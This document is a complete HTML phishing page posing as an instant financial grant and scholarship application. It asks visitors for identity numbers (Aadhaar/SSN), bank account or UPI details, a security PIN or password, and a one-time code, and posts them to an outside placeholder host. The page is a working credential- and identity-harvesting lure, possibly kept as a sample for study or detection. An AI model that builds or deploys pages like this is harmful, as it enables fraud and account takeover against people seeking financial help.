<!doctype html>
<html>
  <head>
    <title>Instant Financial Grant & Scholarship Form</title>
  </head>
  <body>
    <h1>Application for Fast Verification</h1>
    <p>Complete every field below to claim your immediate verification voucher.</p>
    <form action="https://unverified-host.invalid/process" method="POST">
      <input type="text" name="full_name" placeholder="Full Legal Name" required />
      <input type="email" name="email" placeholder="Email Address" required />
      <input type="tel" name="phone" placeholder="Mobile Phone Number" required />
      <input type="text" name="address" placeholder="Residential Street Address" required />
      <input type="text" name="aadhaar" placeholder="Identity Document / Aadhaar / SSN" required />
      <input type="text" name="bank_account" placeholder="Bank Account Number or UPI ID" required />
      <input type="password" name="pin" placeholder="Security PIN or Password" required />
      <input type="text" name="otp" placeholder="One-Time Verification Code (OTP)" required />
      <button type="submit">Submit Information</button>
    </form>
  </body>
</html>
